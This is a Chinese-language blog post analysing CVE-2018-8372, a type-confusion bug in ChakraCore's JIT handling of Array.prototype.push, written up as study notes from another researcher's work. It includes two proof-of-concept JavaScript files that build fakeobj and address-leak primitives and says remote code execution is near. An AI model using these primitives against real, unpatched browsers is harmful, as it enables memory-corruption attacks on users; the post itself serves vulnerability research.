<!DOCTYPE html>
<html lang="zh-Hans">





<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content="zs0zrc&#39;s blog">
  <meta name="author" content="zs0zrc">
  <meta name="keywords" content="pwn CTF security anythings">
  <title>CVE-2018-8372 - zs0zrc</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">


<!-- 自定义样式保持在最底部 -->


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">Archives</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">Categories</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">Tags</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">About</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">Links</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/image1.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  Saturday, June 1st 2019, 12:50 pm
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    1.9k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      7 分钟
                  </span>
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="far fa-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
              <p class="note note-warning">本文最后更新于：Thursday, June 6th 2019, 11:38 am</p>
            
            <div class="markdown-body">
              <p>跟着大佬博客学习Chakra</p>
<h3 id="JIT优化eliminate-duplicate-check"><a href="#JIT优化eliminate-duplicate-check" class="headerlink" title="JIT优化eliminate duplicate check"></a>JIT优化eliminate duplicate check</h3><p>test1.js</p>
<pre><code class="js">var arr = [1.1,2.2];
function jit()
{
    arr[1] = 2.2;
    arr[2] = 1.1;
}
</code></pre>
<p>run：</p>
<blockquote>
<p>.\ch.exe .\test1.js -bgjit- -mic -dump:Globopt -OutputFile:output.txt</p>
</blockquote>
<p><img src="/picture/1559488743485.png" srcset="/img/loading.gif" alt="1559488743485"></p>
<p>在第一次对arr数组操作时，会检查arr的类型，而在第二次对arr数组操作时，就不需要<code>BailOnNotArray</code>的检查了，这是JS引擎对冗余检查的优化，但是当其中可能存在带回调的操作时就不能消除这个检查。</p>
<p>例如:</p>
<pre><code class="js">arr[1] = 1.1
object.property;回调
arr[2] = 2.2
</code></pre>
<p>这里涉及到了Chakra的kill 机制，这个机制主要用于去除保存的type类型。其中对JSArray处理的代码是<code>GlobOpt::CheckJsArrayKills</code>这个函数，位于/lib/Backend/GlobOpt.cpp中。</p>
<p><img src="/picture/1559523039710.png" srcset="/img/loading.gif" alt="1559523039710"></p>
<p>其中有两处关键的判断，一处是<code>doArrayMissingValueCheckHoist</code>， 另一处是检查数组类型和element的类型是否一致，如果一致的话就不去除type信息，如果不一致的话就将type信息去除。</p>
<p>引用大宝的分析：</p>
<blockquote>
<p>代码注释已经说得很清楚,假如array的type与element type一致,就不要把type信息去掉,这是一个比较激进的优化,而InlineArrayPush opcod通过调用Array.prototype.push生成的.简单来说就是,假如生成这么一段代码:</p>
<p>arr[1] = 2.2;<br> arr.push(value);<br> arr[1] = 3.3;</p>
<p>假如arr的type信息是float array,value的type信息是float,前面保存的arr type信息就不会被kill.换言之,在|arr[1] = 3.3;|中就不会生成|baitOnNotArray| IR,没有了type类型的检查代码.是的,这样就非常快了,比v8还快,但是安全吗?需要注意的是,在push里面不能触发回调,因为InlineArrayPush会生成|BailOutOnImplicitCallsPreOp|,如果触发回调是会bailout的.</p>
</blockquote>
<p><code>InlineArrayPush</code>生成<code>BailOutOnImplicitCallsPreOp</code>的部分代码</p>
<p><img src="/picture/1559523752706.png" srcset="/img/loading.gif" alt="1559523752706"></p>
<p>它会检查数组是否为nativeArray，如果不是的话就会生成 <code>BailOutOnImplicitCallsPreOp</code>，否则的话生成<code>BailOutConventionalNativeArrayAccessOnly</code>，因此就不能传带回调的非NativeArray的对象给push。</p>
<p>而这就存在一种假设：</p>
<blockquote>
<p>是不是不通过回调就改变不了arr对象的类型？</p>
</blockquote>
<p>###Javascript undefine</p>
<p>undefine是JS五个基本的值类型中的一个，这个类型只有一个值，JS使用magic value(0x800000280000002)来表示。它在浮点数的表示范围里，对应的浮点数是-5.3049894784e-314，为了区分undefine和这个浮点数，Chakra在<code>setItem</code>中有一个特殊的处理。</p>
<p>JavascriptNativeFloatArray::SetItem在dValue刚好为Magic value时会进行数组类型转换，将数组类型由float array转变成var array，而push函数就是通过调用setItem函数来设置值的。</p>
<p><img src="/picture/1559525341598.png" srcset="/img/loading.gif" alt="1559525341598"></p>
<p>在script层调用push会调用EntryPush这个函数</p>
<p><img src="/picture/1559525694109.png" srcset="/img/loading.gif" alt="1559525694109"></p>
<p>所以上面的问题也就有了答案：不通过回调也能修改arr对象类型</p>
<h3 id="Don’t-kill-my-NativeArray"><a href="#Don’t-kill-my-NativeArray" class="headerlink" title="Don’t kill my NativeArray"></a>Don’t kill my NativeArray</h3><p>但是经过下面的代码，在arr.push()时arr数组的type信息还是被去除了，arr[2]还是有<code>BailOnNotArray</code>的检查</p>
<pre><code class="js">arr[1] = 1.1;
arr.push(1.123);
arr[2] = 2.2;
</code></pre>
<p><img src="/picture/1559531481479.png" srcset="/img/loading.gif" alt="1559531481479"></p>
<p>为什么push传入一个float值但是数组的type信息还是被去除了呢？</p>
<p>这涉及<code>GlobOpt::CheckJsArrayKills</code>对<code>InlineArraypush</code> opcode的操作</p>
<p><img src="/picture/1559532011888.png" srcset="/img/loading.gif" alt="1559532011888"></p>
<p><img src="/picture/1559531995832.png" srcset="/img/loading.gif" alt="1559531995832"></p>
<p>它会根据<code>doArrayMissingValueCheckHoist</code>的值来决定是否要将<code>KillsArraysWithNoMissingValues</code>设为true。<code>doArrayMissingValueCheckHoist</code>值初始为1，在前面的操作过程中可能会改变。</p>
<p>MissValue对应的kill操作</p>
<p><img src="/picture/1559550895684.png" srcset="/img/loading.gif" alt="1559550895684"></p>
<p>如果arr中type信息没有MissValue，那么经过push后，还是会删除arr的type信息。这个很好绕过，只要让<code>valueInfo-&gt;HasNoMissingValues()</code>返回值为false就可以了。如何让它返回值为false呢，传入一个带MissValue的arr就可以了。在经过push后，数组的类型就由float array转变成了var array。</p>
<p>Poc.js</p>
<pre><code class="js">function jit(arr,value)
{
    arr[0]=1.1;
    arr.push(value);
    arr[1]= 6.17651672645e-312 // 0x12345678
}

let arr = [1.1,2.2,3.3];

for(let i = 0; i &lt; 20000; i++)
{
    arr2 = [2,3,4,5,6.6,7,8,9];
    delete(arr2[1]);
    jit(arr2,3.3);
}
jit(arr,-5.3049894784e-314); //0x8000000280000002 magic value
print(arr[0]);//这个不回报错
print(arr[1]);//这个会报错，因为它引用了0x12345678地址处的内容当作对象，会crash
</code></pre>
<p><img src="/picture/1559561484019.png" srcset="/img/loading.gif" alt="1559561484019"></p>
<p>通过上面的poc可以实现fakeobj原语，但leakaddr原语实现有点巧妙。在经过push后，<code>arr</code>对象的类型已经修改为var array了，我们可以对它进行任何关于var array的操作。现在<code>arr</code>可以用于var array的赋值，并且这个赋值可以是任意的对象。</p>
<p>var array赋值对应的字节码为<code>StElem_A</code>， 查看<code>oarr[2] = leak_obj</code>生成的对应IR信息</p>
<p><img src="/picture/1559568132152.png" srcset="/img/loading.gif" alt="1559568132152"></p>
<p>这里检查了oarr的类型是否为var array, MissValue是否符合以index大小是否超出了范围。数组赋值时要注意不要触发<code>StElem_A</code>这个Opcode的任何bailout。通过赋值后，oarr[2]上有一个对象的地址，只有通过return oarr[2] 就可以获得这个对象的地址。要注意的是，这个return 返回的类型是float，它将对象地址以浮点数的方式返回，这是因为<code>arr</code>数组此时在JIT的proflie信息中还是一个double array。</p>
<p>Poc.js</p>
<pre><code class="js">function u2d(value)
{
    let f = new Float64Array(1);
    f[0] = value;
    let ut = new Uint32Array(f.buffer);
    return ut[1]*0x100000000 + ut[0]; 
}

function jit_leak(arr,value,oarr,leak_obj)
{
    arr[0] = 1.1;
    arr.push(value);
    oarr[2] = leak_obj; // arr is var array, bypass type check and NOT bailout
    return oarr[2];
}

let arr = [1.1,2.2,3.3];

for(let i = 0; i &lt; 20000; i++)
{
    arr2 = [2,3,4,5,6.6,7,8,9];
    delete(arr2[1]);
    oarr = [1.1,2.2,3.3,{}];

    jit_leak(arr2, 3.3, oarr, {});
}
var hax = new Uint8Array(0x1000);
let result = jit_leak(arr,-5.3049894784e-314, arr, hax/*obj to leak*/);

print(u2d(result).toString(16));
</code></pre>
<p>大宝对Poc的解析：</p>
<blockquote>
<p>  在每次JIT开始之前,都会经历一个profile阶段,用于收集对象的类型信息用于JIT时候生成相关的类型检查与访问代码.在Profile阶段,我传入了一个NoMissingValues为false的float array,所以|arr[0]|和|arr[2]|的读写都是以float形式访问,换句话说,如果arr数组中存在对象的地址则可以通过|return arr[2]|成功读取出来.但是必须在第一句|arr[0]|通过类型检查,也就是arr一开始必须为float array类型.<br>其次,我传入了一个var array类型的数组|oarr|,所以|oarr[2] = leak_object|会把需要泄露的对象地址赋值到oarr[2]中,但是必须通过类型检查,也就是oarr在访问的时候必须为var array类型.<br>在漏洞触发的最后一次调用中,|arr|和|oarr|其实是同一个数组,在|arr[0] = 1.1|中,此时arr是float array,通过检查,赋值成功.通过|arr.push(value)|触发漏洞,改变数组类型,变成var array类型.在第三行代码|oarr[2] = leak_object|,因为|arr|和|oarr|是同一个数组,所以oarr当前为var array类型,通过检查,赋值成功.  </p>
<p>最后一句是最关键的代码,我们可以看到,|arr[0] = 1.1|和|return arr[2]|中有两行代码,这两行代码必须不能kill |arr|的type信息,否则就会重新类型检查,因为arr已经转变成var array类型了,如果此时有类型检查就会检查失败然后bailout.上文已经详细分析了如果arr NoMissingValues为false,|arr.push(value)|是不会kill arr的type信息的.所以现在剩下|oarr[2] = leak_object|这句,对应的opcode是StElemI_A,|CheckJsArrayKills|代码如下:</p>
<p><img src="/picture/1559569852860.png" srcset="/img/loading.gif" alt="1559569852860"></p>
<p>我们可以看到,并没有任何情况会kill array的type信息.所以到最后没有任何类型检查,直接以浮点数的方式访问已经变成var array类型的arr,返回刚刚赋值的对象|leak_object|,将浮点数转换为16进制,即可得到对象的地址.得到这两个原语以后,距离RCE就不远了.</p>
</blockquote>
<h3 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h3><ul>
<li><a href="https://blogs.projectmoon.pw/2018/08/17/Edge-InlineArrayPush-Remote-Code-Execution/" target="_blank" rel="noopener">https://blogs.projectmoon.pw/2018/08/17/Edge-InlineArrayPush-Remote-Code-Execution/</a></li>
</ul>

            </div>
            <hr>
            <div>
              <p>
                
                  <span>
                <i class="iconfont icon-inbox"></i>
                    
                      <a class="hover-with-bg" href="/categories/JS-Engine/">JS-Engine</a>
                      &nbsp;
                    
                      <a class="hover-with-bg" href="/categories/JS-Engine/CVE/">CVE</a>
                      &nbsp;
                    
                  </span>&nbsp;&nbsp;
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/ChakraCore/">ChakraCore</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
            </div>

            
              <!-- Comments -->
              <div class="comments" id="comments">
                
                
  <script defer src="https://utteranc.es/client.js" repo="zszcr/comment" issue-term="pathname" label="utterances" theme="github-light" crossorigin="anonymous" async>
  </script>


              </div>
            
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    </div>
    
  <div>
    
      <!-- 不蒜子统计PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      总访问量 <span id="busuanzi_value_site_pv"></span> 次
    </span>
    
    
      <!-- 不蒜子统计UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      总访客数 <span id="busuanzi_value_site_uv"></span> 人
    </span>
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
<script src="/js/main.js"></script>


  <script src="/js/lazyload.js"></script>



  
  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var post = $('#post');
      var toc = $('#toc');
      var tocLimMax = post.offset().top + post.height() - navHeight;

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = $('#board-ctn').css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<!-- Plugins -->


  

  
    <!-- Google Analytics -->
    <script defer>
      (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function () {
          (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
          m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
      })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

      ga('create', 'UA-160202176-1', 'auto');
      ga('send', 'pageview');
    </script>
  

  

  

  



  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "CVE-2018-8372&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
